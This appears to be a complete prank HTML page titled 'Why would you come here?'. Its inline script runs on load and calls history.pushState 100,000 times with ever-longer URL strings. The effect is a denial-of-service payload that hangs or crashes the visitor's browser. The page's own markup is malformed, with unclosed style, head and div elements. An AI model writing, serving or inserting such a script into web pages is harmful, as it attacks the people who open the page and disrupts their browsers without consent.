<!DOCTYPE html>
<html>
    <head>
        <title>Why would you come here?</title>
        <style>
            * {
                font-family: "Segoe UI", Helvectica, "Helvectica Neu", Verdana, sans-serif;
                font-weight: 100;
            }
            div {
                position: fixed;
                top: 50%;
                left: 50%;
                transform: translate(-50%, -100%);
                background: rgba(0, 0, 0, 0.1);

    <body>
        <div>

        <script>
        var total = "";
        for( var i = 0; i < 100000; i++ ) {
            total = total + i.toString();
            history.pushState(0,0, total );
        }
        </script>
